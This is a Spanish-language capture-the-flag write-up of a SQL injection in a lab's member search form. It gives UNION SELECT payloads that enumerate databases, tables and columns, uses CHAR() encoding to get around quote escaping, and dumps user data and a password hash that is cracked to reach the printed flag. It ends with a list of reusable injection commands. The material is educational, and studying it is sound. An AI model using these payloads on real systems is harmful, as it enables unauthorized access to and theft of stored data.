## Search Member Form Injection

### 1. Mostar nombre de la base de datos actual

Este comando muestra la base de datos actual que se está utilizando.

```
1 UNION SELECT database(), NULL --
```

- ```database()```: Función MariaDB que devuelve el nombre de la base de datos actual.
- ```NULL```: Se selecciona un valor nulo para igualar el número de columnas de la consulta original, en este caso la informacion la va a dar en el apartado "First name" y el NULL es para el apartado "Surname".

### 2. Listar todas las tablas de la base de datos actual

Este comando devuelve una lista de todas las tablas en la base de datos actual a la que se ha conectado el atacante.

```
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() --
```

- ```1```: Selección de la primera columna de la consulta (en este caso, el número 1 es utilizado para igualar el número de columnas en la consulta original, se necesita que se devuelva el usuario 1 y la siguiente consulta con UNION).
</br>
    <img src="./user_sql.png" style="width:150px;">
</br>
- ```UNION```: Operador SQL utilizado para combinar los resultados de múltiples consultas.
- ```SELECT``` table_name, NULL: El atacante está seleccionando el nombre de las tablas (table_name) y un valor nulo en la segunda columna. El valor nulo es necesario para igualar el número de columnas con la consulta original.
- ```FROM``` information_schema.tables: El information_schema es una base de datos especial en MariaDB que contiene información sobre las bases de datos, tablas, columnas, etc. tables es una vista que contiene los nombres de todas las tablas de la base de datos.
- ```--```: Comentario para ocultar el resto de la consulta original (opcional).

### 3. Listar las columnas de una tabla en la base de datos actual
Este comando muestra las columnas de una tabla en la base de datos actual.

```
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = CHAR(117, 115, 101, 114, 115) --
```

- ```CHAR(117, 115, 101, 114, 115)```: Este comando convierte los valores numéricos a caracteres ASCII, lo que da como resultado 'users'. Este es el nombre de la tabla de la que se desea obtener las columnas.

> [!CAUTION]
> ¿Por que uso ASCII en vez de ```'users'``` directamente. Si utilizas ```'users'```, aparece este error: ```You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'users\' --' at line 1```. Eso se debe a una forma común de protección contra inyecciones SQL conocida como "escapado de caracteres". En la mayoría de los sistemas de gestión de bases de datos (DBMS), se utiliza una técnica de escapado para prevenir ataques de inyección SQL, donde los caracteres especiales como las comillas simples (') o dobles (") se preceden por una barra invertida (\) para indicar que esos caracteres deben ser tratados literalmente y no como parte de una expresión SQL. Con carcteres ASCII se puede evitar esta protección.

- ```FROM information_schema.columns```: Esta vista contiene información sobre las columnas de las tablas.
- ```WHERE table_name = 'users'```: Filtra las columnas de la tabla users.

### 4. Mostrar contenido de una columna de una tabla en la base de datos actual
Este comando devuelve el contenido de una columna específica, en este caso, de la tabla users en la base de datos actual.

```1 UNION SELECT first_name, last_name FROM users --```

- ```first_name```: El atacante está solicitando el contenido de la columna first_name de la tabla users.
- ```last_name```: El atacante está solicitando el contenido de la columna last_name de la tabla users.
- ```FROM users```: Especifica la tabla users de la base de datos actual.

Si utilizamos este comando vemos todos los nombres de los usuarios y vemos que uno tiene el nombre GetTheFlag

</br>
    <img src="./name_list.png" style="width:300px;">

</br>

Vemos el comentario que tiene ese usuario con el comando ```1 UNION SELECT first_name, Commentaire FROM users --``` y aparece el siguiente mensaje:

`Decrypt this password -> then lower all the char. Sh256 on it and it's good !`

Con el comando ```1 UNION SELECT first_name, countersign FROM users --``` vemos que la contraseña encriptada es: ```5ff9d0165b4f92b14994e5c685cdce28```, que parece algoritmo de hashing MD5. Si probamos a desencriptarlo queda como ```FortyTwo```.

Como dice el mensaje, pasamos todo a minúsculas (```fortytwo```) y lo encriptamos con algoritmo de hash SH256, resultando finalmente en la flag que buscamos.

#### ```10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5```













## Comandos útiles para injeccion SQL

### Listar tablas de una base de datos específica
Este comando muestra todas las tablas en una base de datos específica, en este caso, la base de datos llamada Member_Sql_Injection.

```
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110) --
```

- ```CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)```: Esta función CHAR() convierte una secuencia de valores numéricos en caracteres ASCII. En este caso, se traduce a 'Member_Sql_Injection'.
- ```WHERE table_schema = 'Member_Sql_Injection'```: Filtra las tablas de la base de datos Member_Sql_Injection.

### Listar todas las bases de datos

Este comando muestra una lista de todas las bases de datos disponibles en el servidor MariaDB.

```
1 UNION SELECT schema_name, NULL FROM information_schema.schemata --
```

- ```schema_name```: Devuelve el nombre de cada base de datos.
- ```FROM information_schema.schemata```: El information_schema.schemata es una vista que contiene información sobre todas las bases de datos en el servidor MariaDB.

### Listar todas las tablas de todas las bases de datos

Este comando de inyección SQL permite listar todas las tablas en todas las bases de datos presentes en el servidor. Se utiliza accediendo a la tabla ```information_schema.tables```, que almacena metadatos sobre todas las tablas del sistema.

```
1 UNION SELECT table_name, NULL FROM information_schema.tables --
```

- ```table_name```: Especifica que queremos obtener el nombre de las tablas.

- ```information_schema.tables```: Es una tabla del esquema de sistema que contiene metadatos de todas las tablas disponibles en el servidor. Incluye tablas de todas las bases de datos.

### Listar las columnas de una tabla en una base de datos específica
Este comando muestra las columnas de una tabla de una base de datos específica. En este caso, la base de datos es Member_Sql_Injection y la tabla es users.

```
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'Member_Sql_Injection' --
```

- ```WHERE table_name = 'users' AND table_schema = 'Member_Sql_Injection'```: Filtra las columnas de la tabla users en la base de datos Member_Sql_Injection.

### Mostrar contenido de una columna de una tabla en una base de datos específica
Este comando muestra el contenido de la columna username de la tabla users en la base de datos Member_Sql_Injection.

```
1 UNION SELECT first_name, NULL FROM Member_Sql_Injection.users -- 
```

- ```Member_Sql_Injection.users```: Especifica la base de datos Member_Sql_Injection y la tabla users.

- ```first_name```: Se selecciona el contenido de la columna first_name.
